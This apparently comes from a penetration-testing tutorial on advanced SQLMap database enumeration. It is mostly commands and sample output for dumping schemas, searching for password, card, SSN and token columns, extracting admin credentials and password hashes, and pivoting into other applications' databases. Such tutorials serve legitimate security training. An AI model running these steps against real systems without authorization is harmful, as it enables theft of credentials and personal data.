---
title: 'Advanced Database Enumeration'
description: 'Schema dumps, conditional extraction, search functions, pivot tables, and advanced SQLMap enumeration techniques for complex engagements.'
icon: material/database-cog
tags:
  - sqlmap
  - advanced-enumeration
  - database
---

# Advanced Database Enumeration

Beyond basic dumping, SQLMap offers powerful features for **targeted, efficient data extraction** in complex environments.

---

## Schema Dump — The Full Blueprint

The `--schema` flag dumps the **entire database schema** — every database, table, column, and data type — without extracting any actual data:

```bash
sqlmap -r request.txt --schema --batch
```

```text title="Example Output"
Database: ecommerce
Table: users
[7 columns]
+------------------+--------------+
| Column           | Type         |
+------------------+--------------+
| id               | int(11)      |
| username         | varchar(50)  |
| email            | varchar(100) |
| password         | varchar(255) |
| role             | enum('admin','user','moderator') |
| created_at       | timestamp    |
| profile_picture  | blob         |
+------------------+--------------+

Table: orders
[6 columns]
+------------------+--------------+
| Column           | Type         |
+------------------+--------------+
| order_id         | int(11)      |
| user_id          | int(11)      |
| product_id       | int(11)      |
| quantity         | int(11)      |
| total_price      | decimal(10,2)|
| order_date       | datetime     |
+------------------+--------------+

...
```

!!! tip "Why Schema Dump First?"

    Always dump the schema **before** dumping data. This lets you:

    1. **Plan your extraction** — identify which tables and columns are worth dumping
    2. **Understand relationships** — see foreign keys and how tables connect
    3. **Estimate time** — a table with 10 million rows will take much longer than one with 100
    4. **Identify sensitive columns** — find password, credit card, SSN, and API key columns

---

## Search Functions — Finding Needles in Haystacks

When you don't know which table contains the data you want, use SQLMap's search functions.

### Search for Tables by Name

```bash title="Find any table containing 'user' in its name"
sqlmap -r request.txt --search -T user --batch
```

```text title="Output"
[INFO] searching tables LIKE 'user'
[INFO] retrieved: ecommerce.users
[INFO] retrieved: ecommerce.user_sessions
[INFO] retrieved: ecommerce.user_preferences
[INFO] retrieved: mysql.user
```

### Search for Columns by Name

```bash title="Find any column containing 'pass' in its name"
sqlmap -r request.txt --search -C pass --batch
```

```text title="Output"
[INFO] searching columns LIKE 'pass'
columns LIKE 'pass' were found in the following databases:
Database: ecommerce
Table: users
[1 column]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| password  | varchar(255) |
+-----------+--------------+

Database: ecommerce
Table: password_resets
[1 column]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| temp_password  | varchar(100) |
+----------------+--------------+

Database: mysql
Table: user
[1 column]
+-----------------------+-----------+
| Column                | Type      |
+-----------------------+-----------+
| authentication_string | text      |
+-----------------------+-----------+
```

This instantly reveals every location where passwords are stored across **all databases**.

### Search for Databases by Name

```bash title="Find databases containing 'prod' in the name"
sqlmap -r request.txt --search -D prod --batch
```

### Common Search Patterns

```bash title="Find credit card data"
sqlmap -r request.txt --search -C "card,credit,cvv,ccn,pan" --batch
```

```bash title="Find email addresses"
sqlmap -r request.txt --search -C "email,mail" --batch
```

```bash title="Find API keys and secrets"
sqlmap -r request.txt --search -C "api_key,secret,token" --batch
```

```bash title="Find SSN/ID numbers"
sqlmap -r request.txt --search -C "ssn,social,national_id" --batch
```

---

## Conditional Dumping with `--where`

Instead of dumping entire tables, extract only the rows you need:

```bash title="Only dump admin accounts"
sqlmap -r request.txt \
  -D ecommerce -T users \
  --dump \
  --where="role='admin'" \
  --batch
```

```bash title="Dump recent orders (last 30 days)"
sqlmap -r request.txt \
  -D ecommerce -T orders \
  --dump \
  --where="order_date > DATE_SUB(NOW(), INTERVAL 30 DAY)" \
  --batch
```

```bash title="Dump high-value transactions"
sqlmap -r request.txt \
  -D ecommerce -T orders \
  --dump \
  --where="total_price > 1000" \
  --batch
```

---

## Row Counting

Before dumping a table, check how many rows it has:

```bash title="Count rows in a table"
sqlmap -r request.txt -D ecommerce -T users --count --batch
```

```text title="Output"
[INFO] fetching number of entries for table 'users' in database 'ecommerce'
Database: ecommerce
+---------+---------+
| Table   | Entries |
+---------+---------+
| users   | 47,832  |
+---------+---------+
```

!!! warning "Think Before Dumping"

    If a table has 47,832 rows and you're using blind injection, dumping the entire table could take **days**. Use `--where`, `--start`/`--stop`, or target specific columns.

---

## Raw SQL Queries with `--sql-query`

For complex data extraction that doesn't fit into SQLMap's flags, execute arbitrary SQL:

```bash title="Run a single query"
sqlmap -r request.txt \
  --sql-query="SELECT username, email FROM users WHERE role='admin'" \
  --batch
```

```bash title="Count users by role"
sqlmap -r request.txt \
  --sql-query="SELECT role, COUNT(*) FROM users GROUP BY role" \
  --batch
```

```bash title="Find users who haven't changed their password"
sqlmap -r request.txt \
  --sql-query="SELECT username FROM users WHERE password_changed_at IS NULL" \
  --batch
```

### Interactive SQL Shell

For exploratory enumeration, use the interactive SQL shell:

```bash
sqlmap -r request.txt --sql-shell
```

```text title="Interactive Session"
sql-shell> SELECT table_name, table_rows FROM information_schema.tables 
WHERE table_schema='ecommerce' ORDER BY table_rows DESC;

+-----------------+------------+
| table_name      | table_rows |
+-----------------+------------+
| sessions        | 234567     |
| orders          | 47832      |
| order_items     | 125678     |
| products        | 3421       |
| users           | 1847       |
| categories      | 42         |
| reviews         | 8923       |
| password_resets  | 156       |
+-----------------+------------+

sql-shell> SELECT username, email, role FROM users WHERE role='admin';
+----------+------------------+-------+
| username | email            | role  |
+----------+------------------+-------+
| admin    | admin@target.com | admin |
| sysadmin | sys@target.com   | admin |
+----------+------------------+-------+

sql-shell> quit
```

---

## Cross-Database Enumeration

If the user has permissions on multiple databases, you can pivot:

```bash title="Enumerate a different database"
sqlmap -r request.txt -D mysql -T user -C user,authentication_string --dump --batch
```

```bash title="Look for other applications' databases"
sqlmap -r request.txt --dbs --batch
```

```text title="Multiple Application Databases"
available databases [7]:
[*] ecommerce          ← Current app
[*] wordpress_blog     ← Another app's DB
[*] helpdesk           ← Internal tool
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

Now you can enumerate tables in `wordpress_blog` and `helpdesk` too:

```bash
sqlmap -r request.txt -D wordpress_blog --tables --batch
sqlmap -r request.txt -D helpdesk --tables --batch
```

---

## Excluding System Databases

When using `--dump-all`, exclude system databases to focus on application data:

```bash title="Dump all application data, skip system DBs"
sqlmap -r request.txt \
  --dump-all \
  --exclude-sysdbs \
  --batch
```

This skips `information_schema`, `mysql`, `performance_schema`, `sys`, and equivalent system databases on other DBMS platforms.

---

## Enumeration Through Pivoting

Sometimes you discover multiple injection points across different applications that share the same database server. You can use one injection to access data for another application:

```bash title="Step 1: Discover databases through injection in App A"
sqlmap -r app_a_request.txt --dbs --batch
# Discovers: app_a_db, app_b_db, mysql

# Step 2: Enumerate App B's data through App A's injection point
sqlmap -r app_a_request.txt -D app_b_db --tables --batch
sqlmap -r app_a_request.txt -D app_b_db -T users --dump --batch
```

---

## Output Formats

### CSV (Default)

```bash
sqlmap -r request.txt -D ecommerce -T users --dump --batch
# Output saved to: ~/.sqlmap/output/target.com/dump/ecommerce/users.csv
```

### Custom Dump Format

```bash title="Change the CSV delimiter"
sqlmap -r request.txt -D ecommerce -T users --dump --dump-format=CSV --batch
```

```bash title="Dump as HTML table"
sqlmap -r request.txt -D ecommerce -T users --dump --dump-format=HTML --batch
```

```bash title="Dump as SQLite database"
sqlmap -r request.txt -D ecommerce -T users --dump --dump-format=SQLITE --batch
```

---

## Practical Enumeration Cheatsheet

```bash title="Complete Enumeration Workflow"
# Step 1: Reconnaissance
sqlmap -r req.txt --banner --current-user --current-db --is-dba --batch

# Step 2: List databases
sqlmap -r req.txt --dbs --batch

# Step 3: List tables
sqlmap -r req.txt -D ecommerce --tables --batch

# Step 4: Schema overview
sqlmap -r req.txt -D ecommerce --schema --batch

# Step 5: Find sensitive columns
sqlmap -r req.txt --search -C "pass,secret,token,key,ssn,card" --batch

# Step 6: Count rows before dumping
sqlmap -r req.txt -D ecommerce -T users --count --batch

# Step 7: Dump credentials
sqlmap -r req.txt -D ecommerce -T users -C username,password,email --dump --batch

# Step 8: Dump database user hashes
sqlmap -r req.txt --passwords --batch

# Step 9: Check other databases
sqlmap -r req.txt -D wordpress_blog --tables --batch
```
